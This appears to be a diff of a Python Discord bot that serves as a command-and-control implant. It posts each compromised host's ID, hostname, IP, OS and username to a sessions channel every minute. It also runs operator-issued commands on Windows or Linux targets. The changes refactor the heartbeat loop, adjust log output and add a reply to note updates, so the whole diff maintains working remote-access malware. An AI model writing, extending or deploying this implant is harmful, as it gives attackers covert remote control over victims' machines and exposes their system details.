@@ -98,7 +98,7 @@ def log_msg(msg):
 	print(f'{get_datetime()} {msg}')
 
 def log_good(msg):
-	log_msg(f'[✓] {msg}')
+	log_msg(f'[+] {msg}')
 
 def log_info(msg):
 	log_msg(f'[i] {msg}')
@@ -161,7 +161,7 @@ async def delete_session_entry(i_id):
 
 ## get string containing implant info
 def get_implant_data_str():
-	return f'ID: `{implant.id}` | HN: `{implant.hostname}` | IP: `{implant.ip}` | OS: `{implant.os}` | User: `{implant.user}`{f' | Note: {implant.note}' if implant.note not "" else ""}'
+	return f'ID: `{implant.id}` | HN: `{implant.hostname}` | IP: `{implant.ip}` | OS: `{implant.os}` | User: `{implant.user}`{f' | Note: `{implant.note}`' if not implant.note == "" else ""}'
 
 ## helpers for running a command
 ### actually run the command
@@ -193,15 +193,84 @@ async def a_cmd(ctx, arg):
 
 #### windows
 async def w_cmd(ctx, arg):
-	if not implant.os == 'Windows':
-		return
-	await _cmd(ctx, arg)
+	if implant.os == 'Windows':
+		await _cmd(ctx, arg)
 
 #### linux
 async def l_cmd(ctx, arg):
-	if not implant.os == 'Linux':
-		return
-	await _cmd(ctx, arg)
+	if implant.os == 'Linux':
+		await _cmd(ctx, arg)
+
+async def sessions_loop():
+	utc_now = datetime.now(timezone.utc)
+
+	log_info(f'Running sessions loop, current utc time: {utc_now}')
+
+	# stale timestamp
+	stale = utc_now-timedelta(minutes=mins_stale)
+	# dead timestamp
+	dead = utc_now-timedelta(minutes=mins_dead)
+	# remove timestamp
+	remove = utc_now-timedelta(minutes=mins_remove)
+
+	# delete any old messages or duplicates of self, change react
+	messages = [message async for message in implant.sessions_channel.history(limit=100)]
+	for message in messages:
+		
+		if remove > message.created_at or implant.id in message.content:
+			log_info(f'Found sessions message to remove with ID: {message.id}')
+			log_info(f'Content: {message.content}')
+			
+			try:
+				await message.delete()
+			except Exception as ex:
+				log_warn(f'Unable to delete msg ID {message.id}: {ex}')
+		
+		elif dead > message.created_at:
+			found = False
+			for r in message.reactions:
+				if dead_react == r.emoji:
+					found = True
+			if found:
+				continue
+
+			log_info(f'Found dead sessions message with ID: {message.id}')
+			log_info(f'Content: {message.content}')
+			
+			try:
+				await message.clear_reactions()
+				await message.add_reaction(dead_react)
+			except Exception as ex:
+				log_warn(f'Unable to clear or add reaction to msg ID {message.id}: {ex}')
+		
+		elif stale > message.created_at:
+			found = False
+			for r in message.reactions:
+				if stale_react == r.emoji:
+					found = True
+			if found:
+				continue
+
+			log_info(f'Found stale sessions message with ID: {message.id}')
+			log_info(f'Content: {message.content}')
+			
+			try:
+				await message.clear_reactions()
+				await message.add_reaction(stale_react)
+			except Exception as ex:
+				log_warn(f'Unable to clear or add reaction to msg ID {message.id}: {ex}')
+
+	log_info(f'Adding new session message for implant ID: {implant.id}')
+	# post new message
+	try:
+		note = implant.note
+		new_msg = await implant.sessions_channel.send(get_implant_data_str())
+		await new_msg.add_reaction(good_react)
+	except Exception as ex:
+		log_warn(f'Unable to add new session message or react to it: {ex}')
+
+	log_info(f'Sleeping')
+	await asyncio.sleep(60)
 
 # bot land
 ## events
@@ -224,7 +293,7 @@ async def on_ready():
 	msg += f'| Hostname: `{implant.hostname}`'
 	msg += f'| IP: `{implant.ip}`\n'
 	msg += f'| OS: `{implant.os}`\n'
-	msg += f'| Username: `{implant.user}`\n'
+	msg += f'| Username: `{implant.user}`'
 	msg += f'--------------------------------------------------'
 	try:
 		# tell the server we exist
@@ -234,57 +303,8 @@ async def on_ready():
 	
 	log_info(f'Entering sessions loop')
 	while(True):
-
-		utc_now = datetime.now(timezone.utc)
-
-		log_info(f'Running sessions loop, current utc time: {utc_now}')
-
-		# stale timestamp
-		stale = utc_now-timedelta(minutes=mins_stale)
-		# dead timestamp
-		dead = utc_now-timedelta(minutes=mins_dead)
-		# remove timestamp
-		remove = utc_now-timedelta(minutes=mins_remove)
-
-		# delete any old messages or duplicates of self, change react
-		messages = [message async for message in implant.sessions_channel.history(limit=100)]
-		for message in messages:
-			if remove > message.created_at or implant.id in message.content:
-				log_info(f'Found sessions message to remove with ID: {message.id}')
-				log_info(f'Content: {message.content}')
-				try:
-					await message.delete()
-				except Exception as ex:
-					log_warn(f'Unable to delete msg ID {message.id}: {ex}')
-			elif dead > message.created_at:
-				log_info(f'Found dead sessions message with ID: {message.id}')
-				log_info(f'Content: {message.content}')
-				try:
-					await message.clear_reactions()
-					await message.add_reaction(dead_react)
-				except Exception as ex:
-					log_warn(f'Unable to clear or add reaction to msg ID {message.id}: {ex}')
-			elif stale > message.created_at:
-				log_info(f'Found stale sessions message with ID: {message.id}')
-				log_info(f'Content: {message.content}')
-				try:
-					await message.clear_reactions()
-					await message.add_reaction(stale_react)
-				except Exception as ex:
-					log_warn(f'Unable to clear or add reaction to msg ID {message.id}: {ex}')
-
-		log_info(f'Adding new session message for implant ID: {implant.id}')
-		# post new message
-		try:
-			note = implant.note
-			new_msg = await implant.sessions_channel.send(get_implant_data_str())
-			await new_msg.add_reaction(good_react)
-		except Exception as ex:
-			log_warn(f'Unable to add new session message or react to it: {ex}')
-
-		log_info(f'Sleeping')
-		await asyncio.sleep(60)
-
+		await sessions_loop()
+		
 ### fires when the bot sees a message. just logs that a message was seen
 @bot.event
 async def on_message(message):
@@ -374,6 +394,7 @@ async def note(ctx, arg1, arg2):
 	if not arg1 == implant.id:
 		return
 	log_info(f'{implant.id} received note command with note {arg2}')
+	await reply_thread_once(ctx, f'Updating note for implant `{implant.id}` to `{arg2}`')
 	implant.note = arg2
 
 @bot.command()
